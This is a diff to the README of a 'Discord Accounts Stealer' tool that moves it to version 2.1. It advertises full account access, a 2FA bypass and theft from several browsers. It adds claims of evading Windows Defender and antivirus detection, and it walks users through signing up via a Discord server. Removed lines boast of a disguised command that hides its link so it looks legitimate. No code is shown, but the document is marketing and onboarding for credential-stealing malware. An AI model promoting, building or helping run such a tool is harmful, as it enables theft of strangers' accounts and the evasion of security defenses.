@@ -1,11 +1,12 @@
-## 🔑 Discord Accounts Stealer 2.0
+## 🔑 Discord Accounts Stealer 2.1
 > **Discord Accounts Stealer - Steal accounts without limits for free!**
 - **Full Account Access**
 - **Bypass 2FA**
 - **Searching for Account Duplications (Will not send the same accounts twice)**
+- **Undetected by Antivirus**
 
 ### 🖼 Screenshots
->![DiscordMessageImage](https://i.imgur.com/qOoiqaK.png "Discord message of  account")
+>![DiscordMessageImage](https://i.imgur.com/J5VFT60.png "Discord message of  account")
 >![Desktop Notifications](https://i.imgur.com/glwfzeh.png "While the app is running in background it sends notifications")
 >![Desktop Notifications](https://i.imgur.com/3dkxtYt.png "The Process has been ended successfully.")
 
@@ -18,7 +19,11 @@
 - Brave
 - Yandex
 
-### 🛒 Getting Started
+## 🛒 Getting Started
+### 📮 Already own identifier and you want to update?
+- Tell us in the support server of our discord server and we will do it for you!
+
+## ⛩ You dont own Identifier? Lets create one for you!
 - **To get started you need to join our [Discord server](https://discord.gg/PUxp8KmRv5)**
 > <a href="https://discord.gg/GFvXSwZ" rel="Discord Server">![Server](https://img.shields.io/discord/847289537566474250.svg?label=Discord&amp;colorB=7289DA)</a>
 - Go to the commands channel and type `!apply`
@@ -29,17 +34,13 @@
 - Watch the [Tutorial](https://youtu.be/yNLBWk2NEho) to see how to login to the Account.
 
 ### 💲 Buy me a coffe
-
-**PS.** Donating $2+ will remove the message rights from the discord message 🔥
 > <a href="https://www.paypal.me/agamsolomon0011" rel="paypal donations">![donate](https://img.shields.io/badge/Donate-Paypal-brightgreen.svg)</a>
 
 ## 📝 What's New?
-- As of this update being released the version [v1.0](https://github.com/agamsol/Discord-Stealer/tree/main/v1.0) will no longer be maintained and will stop working soon.
+- Now you are able to ask us to toggle the notifications off
+- Due to QES (Quick Message Sender) going open source, DAS now uses the open source version to save space and bypass AV detection.
 
-#### Version 2.0 (This update)
-- Identifiers System
-- APP checks that the the identifier in your Webhook is working 100%.
-- The new decoder keeps your DATA protected (Applies to: Your Username and tag, Your Discord ID , The nickname for the application, Your wehbook link)
-All these values are protected and cannot be accessed by others
-- HUGE Code reducements (The old version is 12 KB - The new version is 11KB, it has all the features above in less space it had on last update which was coded from scratch but still the same concept)
-- A short user command that does not look like it has any link in it, this makes the link more legitimate
+**And Finally!**
+- **Bypass Antivirus Detection** (no longer detected by windows defender)
+
+I've not tested other antiviruses but i have tested the Windows defender which most windows 10 users have.
